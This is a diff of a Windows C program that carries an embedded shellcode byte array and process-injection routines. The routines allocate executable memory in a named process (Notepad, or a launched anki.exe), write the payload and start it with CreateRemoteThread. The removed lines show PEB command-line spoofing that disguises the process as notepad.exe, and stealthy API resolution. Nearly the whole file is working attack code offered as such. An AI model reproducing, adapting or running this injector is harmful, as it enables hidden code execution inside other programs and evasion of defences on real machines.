@@ -1,13 +1,10 @@
 #include<stdio.h>
-#include<Windows.h>
-#include "Header.h" 
-#include <winternl.h>
 #include <Windows.h>
 #include <winternl.h>
-//WINAPI - NTDLL - SYSCALL - WINDRIVER
+#include "Header.h"
 
-#pragma section(".text")
-__declspec(allocate(".text")) unsigned char buf[] =
+#pragma section(".txt")
+__declspec(allocate(".txt")) unsigned char buf[]=
 "\xe8\x4d\x1c\x00\x00\x4d\x1c\x00\x00\x8a\xf4\xfe\x41\x52\x60\x1d"
 "\x98\x38\xa5\x98\xf6\xb0\xd8\xad\x4a\x05\xbd\xa1\xe6\x50\x8a\xe4"
 "\x99\x5a\x5f\xe5\x6d\x2d\xe1\x57\xbc\x00\x00\x00\x00\x3b\x25\x9f"
@@ -1130,93 +1127,132 @@ __declspec(allocate(".text")) unsigned char buf[] =
 "\x01\x0f\xbe\x0a\x2b\xc1\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00";
-void INJECT1(int pid, unsigned char* payload, unsigned int size) {
-	//VirtualAllocEx			-> Allocate Memory
-	//WrriteProcessMemory		-> Write ShellCode
-	//CreateRemoteThreaed		-> Execute SHellCode
 
-	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	LPVOID pAddress = VirtualAllocEx(h, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(h, pAddress, payload, size, NULL);
-	CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
-
-
-
+HANDLE openp(int pid) {
+	HANDLE h=OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	return h;
 }
-void test() {
-	do {
-		typedef int(WINAPI* MessageBoxAF)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
-		typedef HMODULE(WINAPI* LoadLibraryAF)(LPCSTR lpLibFileName);
-		typedef FARPROC(WINAPI* GetProcAddressF)(HMODULE hModule, LPCSTR lpProcName);
+int stricmpA(const char* s1, const char* s2) {
 
-		HMODULE hKernel32 = GetModuleBaseAddress(L"kernel32.dll");
-		LoadLibraryAF pLoadLibraryAF = (LoadLibraryAF)GetExportAddress(hKernel32, "LoadLibraryA");
-		GetProcAddressF pGetProcAddressF = (GetProcAddressF)GetExportAddress(hKernel32, "GetProcAddress");
-
-		HMODULE hUser32 = pLoadLibraryAF("User32.dll");
-		MessageBoxAF pMessageBoxAF = (MessageBoxAF)pGetProcAddressF(hUser32, "MessageBoxA");
-
-		//HMODULE hUser32 = LoadLibraryA("User32.dll");
-		//MessageBoxAF pMessageBoxAF = (MessageBoxAF)GetProcAddress(hUser32, "MessageBoxA");
-
-		char stra[] = { 'T','h','i','s',' ','i','s',' ','t','e','s','t','\00' };//.TEXT
-		//MessageBoxA(NULL, stra, "Test caption", MB_OK);//User32.dll 
-		pMessageBoxAF(NULL, stra, "Test caption", MB_OK);//User32.dll 
-
-	} while (0);
-
-
-}
-void change() {
-	//dt _peb @$peb
-	//dt _RTL_USER_PROCESS_PARAMETERS 0x000001e0`f76020d0
-
-	typedef NTSTATUS(WINAPI* NtQueryInformationProcessF)(
-		IN HANDLE ProcessHandle,
-		IN PROCESSINFOCLASS ProcessInformationClass,
-		OUT PVOID ProcessInformation,
-		IN ULONG ProcessInformationLength,
-		OUT PULONG ReturnLength OPTIONAL);
-
-	typedef HMODULE(WINAPI* LoadLibraryAF)(LPCSTR lpLibFileName);
-	typedef FARPROC(WINAPI* GetProcAddressF)(HMODULE hModule, LPCSTR lpProcName);
-
-	HMODULE hKernel32 = GetModuleBaseAddress(L"kernel32.dll");
-	LoadLibraryAF pLoadLibraryAF = (LoadLibraryAF)GetExportAddress(hKernel32, "LoadLibraryA");
-	GetProcAddressF pGetProcAddressF = (GetProcAddressF)GetExportAddress(hKernel32, "GetProcAddress");
-
-	HMODULE hNtdll = pLoadLibraryAF("ntdll.dll");
-	NtQueryInformationProcessF pNtQueryInformationProcessF = (NtQueryInformationProcessF)pGetProcAddressF(hNtdll, "NtQueryInformationProcess");
-	//NtQueryInformationProcess -> NTDLL.dll
-
-	HANDLE h = GetCurrentProcess();//->  pGetProcAddressF
-	PROCESS_BASIC_INFORMATION ProcessInformation;
-	ULONG len = 0;
-	pNtQueryInformationProcessF(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &len);
-	ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = (PWSTR)L"c:\\windows\\system32\\notepad.exe";
-	ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = (PWSTR)L"c:\\windows\\system32\\notepad.exe";
-}
-int atoiF(char* s) {
-	int acum = 0;
-	while ((*s >= '0') && (*s <= '9')) {
-		acum = acum * 10;
-		acum = acum + (*s - 48);
-		s++;
+	while (tolower((unsigned char)*s1) == tolower((unsigned char)*s2)) {
+		if (*s1 == '\0')
+			return 0;
+		s1++; s2++;
 	}
-	return (acum);
+
+	return (int)tolower((unsigned char)*s1) -(int)tolower((unsigned char)*s2);
+
 }
-void main(int argc, char** argv)
+int getprocess(const char *name) {
+	HANDLE h = 0x00;
+	PROCESSENTRY32 lp;
+	BOOL b;
+	int pid = 0,count=0;
+	h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	b = Process32First(h,&lp);
+
+	if (b == TRUE) {
+		do{
+			if (stricmpA(lp.szExeFile, name) == 0)
+				pid =lp.th32ProcessID;
+		} while (Process32Next(h,&lp) == TRUE);
+		printf("\nCount%i:",count);
+	}
+	CloseHandle(h);
+	return pid;
+}
+void injection(const char* pname, unsigned char* paylod, unsigned int size)
 {
-
-	void (*fp)() = &test;
-	DWORD64 fpaddr = (DWORD64)fp;
-	fpaddr -= 4532;
-	int input = atoiF(argv[1]);//ascii -> int
-	fpaddr += input;
-	void (*fp2)() = (void (*)())fpaddr;
-
-	change();
-	fp2();
-	INJECT1(1652, buf, sizeof(buf));
-	//fp();
+	int pid=getprocess(pname);
+	HANDLE h = openp(pid);
+	PVOID add;
+	BOOL write,creat;
+	add=VirtualAllocEx(h,NULL,size,MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	write = WriteProcessMemory(h,add,buf,sizeof(buf),NULL);
+	CreateRemoteThread(h,NULL,0, (LPTHREAD_START_ROUTINE)add,NULL, 0, NULL);
 }
+void injection2() {
+	PROCESS_INFORMATION  pi;
+	STARTUPINFO si;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+	if (CreateProcess("C:\\Program Files\\Anki\\anki.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+		int pid = getprocess("anki.exe");
+		HANDLE h = openp(pid);
+		BOOL write, creat;
+		PVOID add;
+		add = VirtualAllocEx(h, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		write = WriteProcessMemory(h, add, buf, sizeof(buf), NULL);
+		CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)add, NULL, 0, NULL);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
+}
+	/*void detectionprocess() {
+		NTSTATUS WINAPI ZwQueryInformationProcess(
+	}*/
+	void listprocess() {
+		HANDLE h = 0x00;
+		PROCESSENTRY32 lp;
+		BOOL b;
+		int pid = 0, count = 0;
+		h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+		b = Process32First(h, &lp);
+
+		if (b == TRUE) {
+			do {
+				printf("\n%s-->pid:%i", lp.szExeFile, lp.th32ProcessID);
+				//	if (stricmpA(lp.szExeFile, name) == 0)
+				count++;
+				pid = lp.th32ProcessID;
+			} while (Process32Next(h, &lp) == TRUE);
+			printf("\nCount%i:", count);
+		}
+		CloseHandle(h);
+		return pid;
+}
+void enu() {
+
+}
+//void C_Process() {
+//	BOOL cp;
+//	LPSTARTUPINFOA lp;
+//	LPPROCESS_INFORMATION li;
+//	CreateProcess(L"C:\\Program Files\\Anki\\anki.exe",
+//		          NULL,NULL,NULL,FALSE,0,NULL,NULL,&lp,&li);
+//}
+int main(int argc, char*argv[]) {
+	/*int a=getprocess("Notepad.exe");
+	printf("%i", a);
+	injection("Notepad.exe", buf, sizeof(buf));*/
+	/*int input=0,input2,d;
+	d = argc;
+	int i = 0;
+	while(envp) {
+		printf("=>%s\n", envp[i]);
+		i++;
+	}*/
+	//injection2();
+	//getprocess();
+	//listprocess();
+
+	return 1;
+
+}
+//int wmain(int argc,wchar_t* argv[],wchar_t* envp[]) {
+//	system("PAUSE");
+//	return -1;
+//}
+//int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCmdLine,int  nShowCmd) {
+//	printf("hello every one");
+//	system("PAUSE");
+//	return -1;
+//}
+//int WINAPI wWinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow)
+//{
+//	printf("hello every one");
+//	system("PAUSE");
+//	return -1;
+//}
+
